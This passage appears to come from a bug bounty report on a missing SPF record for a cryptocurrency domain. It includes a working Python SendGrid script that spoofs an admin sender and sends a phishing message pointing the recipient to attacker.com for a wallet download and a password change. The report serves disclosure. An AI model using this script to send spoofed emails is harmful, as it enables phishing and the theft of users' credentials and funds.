Where you can observe "v=spf1 redirect=_spf.google.com". Further more  this is a functional exploit for this issue (you still need an API key):

```
import sendgrid
import os
from sendgrid.helpers.mail import *
 
sg = sendgrid.SendGridAPIClient(apikey=os.environ.get('SENDGRID_API_KEY'))
from_email = Email("legit-admin@mycrypto.com")
to_email = Email("Your email")
subject = "Please Change your Password"
content = Content("text/plain", "Message From Admin ,Download Wallet from https://attacker.com, Change your password at https://attacker.com")
mail = Mail(from_email, subject, to_email, content)
response = sg.client.mail.send.post(request_body=mail.get())
print(response.status_code)
print(response.body)
print(response.headers)
```
You can also send from a web server or something else of your choosing.

## Impact

Missing SPF record for the in scope domain allows attackers to impersonate emails in order to send targeted phishing emails. This is rather common for ICO's or targeted attacks.
